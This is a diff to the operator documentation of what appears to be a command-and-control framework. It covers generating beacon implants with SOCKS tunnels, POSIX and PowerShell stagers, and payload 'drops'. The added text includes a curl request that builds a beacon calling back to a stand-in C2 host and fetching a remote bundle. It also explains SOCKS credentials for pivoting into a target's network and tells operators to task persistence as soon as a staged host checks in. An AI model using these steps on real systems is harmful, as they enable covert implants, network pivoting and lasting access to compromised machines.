@@ -20,8 +20,11 @@ and the module docstring on
 enabled.** A build with no enabled `c2.tunnel` block refuses `tunnel
 start` with "Generate the build with the tunnel enabled" — there is no
 server, port, public key or PSK in it to dial with, and no way to add
-one after the fact. Ask for a tunnel in the generation request; the
-server mints that build's identity and PSK then and registers them.
+one after the fact. Ask for a tunnel in the generation request — which
+the Beacon Gen form cannot do yet, so see
+[*Asking for a tunnel*](#asking-for-a-tunnel-which-the-beacon-gen-form-cannot-do-yet)
+for the request that can. The server mints that build's identity and PSK
+then and registers them.
 
 Everything below is detail on one of these.
 
@@ -54,6 +57,66 @@ If step 2 produces a refusal instead of a connection, the likeliest
 cause is the crypto path — see [*The crypto path*](#the-crypto-path-and-the-tunnel-that-refuses-to-start),
 and note that the remedy differs for a generated build and a standalone
 one.
+
+---
+
+## Asking for a tunnel, which the Beacon Gen form cannot do yet
+
+**The Beacon Gen panel posts no `tunnel` block and no `drops`, and never
+shows `stager_nix` or `stager_win`.** So a tunnel-enabled build and the
+stager are reachable today only by posting to the route yourself. This is
+an interim gap in the operator interface, not a property of the build:
+the generator accepts both keys and returns everything below.
+
+```sh
+curl -sS -X POST http://127.0.0.1:8444/api/server/beacon-gen \
+  -H "Authorization: Bearer $RACCOON_TOKEN" \
+  -H 'Content-Type: application/json' \
+  -d '{
+    "c2_url": "https://c2.example.com/api/v1/beacon",
+    "layers": 3,
+    "interval": 300,
+    "jitter": 20,
+    "tunnel": {
+      "enabled": true,
+      "server": "c2.example.com",
+      "port": 443,
+      "keepalive_seconds": 30,
+      "allow_slow_crypto": false
+    },
+    "drops": [
+      {"url": "https://example.com/releases/bundle.zip",
+       "sha256": "0123456789abcdef0123456789abcdef0123456789abcdef0123456789abcdef"}
+    ],
+    "persistence": {"gate": "path"}
+  }'
+```
+
+Four things about that body:
+
+- **`tunnel.server` and `tunnel.port` are the address as the target's
+  network reaches it**, which is not necessarily where the tunnel server
+  binds — see *Configuring it*. A URL, a path or a space in `server` is
+  refused rather than baked in.
+- **`psk`, `identity` and `public_key` are refused if you supply them.**
+  They are minted here, one per build, and registered with the tunnel
+  server before the artifact goes out.
+- **`drops` is optional and every entry is pinned.** An entry without 64
+  hex digits of `sha256` is a 400 before any credential is registered.
+- **`persistence.gate` is `path` or `argc`**, and anything else becomes
+  `path`.
+
+Out of the response, five fields matter here and are not shown anywhere
+in the interface:
+
+| Field | What it is for |
+|---|---|
+| `tunnel_identity` | the build's identity: the key of the SOCKS port table, the SOCKS username, and what you delete to retire the build |
+| `stager_nix`, `stager_win` | the second artifact shape — the POSIX and PowerShell stagers. On Windows the stager is the route; see *Staging onto a host with no Python* |
+| `base_dir`, `payload_name`, `gate` | the three per-build values `tools/build_interpreter_bundle.py` needs on its command line |
+
+The PSK is deliberately not among them. It leaves the team server once,
+into the artifact.
 
 ---
 
@@ -154,6 +217,16 @@ entry say which endpoint it reaches — and the password is random, minted
 per identity by the tunnel server, held in memory, never written to disk,
 and shown in the panel row. Read it from there to write your config.
 
+**The port is stable across restarts and the password is not.** Those
+two sentences are about one row and they are not one fact. The port
+assignment is recorded in the tunnel server's port table and survives a
+restart of the tunnel server, the endpoint and the team server; the
+password is minted fresh per identity every time the tunnel server
+starts a SOCKS port for it, so a tunnel server that has been restarted
+has a new password for the same port. After any restart, re-read the
+password off the row before `proxychains` reports an authentication
+failure that looks like a dead tunnel.
+
 The reason it authenticates at all: **loopback is not isolation from
 other local users** on the team server. Binding to `127.0.0.1` keeps
 other hosts out and does nothing whatsoever about anyone else with a
@@ -238,6 +311,20 @@ Python. The second artifact shape from the same generator is a **stager**
    the payload under the build's generated names;
 4. starts the brought interpreter bare.
 
+Then, as an operator step rather than something the stager does:
+
+5. **task `persist` to the agent as soon as it checks in.** The stager
+   installs no persistence — see *Two things the build decided* below for
+   why that is deliberate — and on a staged host there is nothing else to
+   fall back on: the only Python there is the one the stager brought,
+   under a `base_dir` this build generated, so "staged, not persisted,
+   then rebooted" leaves nothing running and nothing an operator can
+   find again. The layout is at least recoverable, because the
+   generator's response reports `base_dir`, `payload_name` and `gate`,
+   but recovering it by hand is not the plan. `persist` installs the
+   autorun entry under the build's own generated name and
+   `unpersist` removes exactly that.
+
 "Optional" is a runtime property, not a build flag: it brings something
 only when it finds nothing.
 
@@ -319,10 +406,12 @@ said it would. The per-build autorun name, the gate and the payload name
 live in the build's `persistence` block and are acted on by the beacon's
 own persist task, which already removes exactly what it installed; a
 second copy of that logic in two shell languages would drift. So
-persistence is an **explicit operator action** — task `persist` to the
-agent — rather than an automatic consequence of staging. The stager's
-last act is to start the brought interpreter bare, which is what runs the
-startup hook under either gate.
+persistence is an **explicit operator action** — step 5 of the sequence
+above, task `persist` to the agent, immediately after a staged host
+checks in — rather than an automatic consequence of staging. The
+stager's last act is to start the brought interpreter bare, which is
+what runs the startup hook under either gate; nothing has yet made that
+survive a reboot.
 
 ### The gate, since two things above refer to it
 
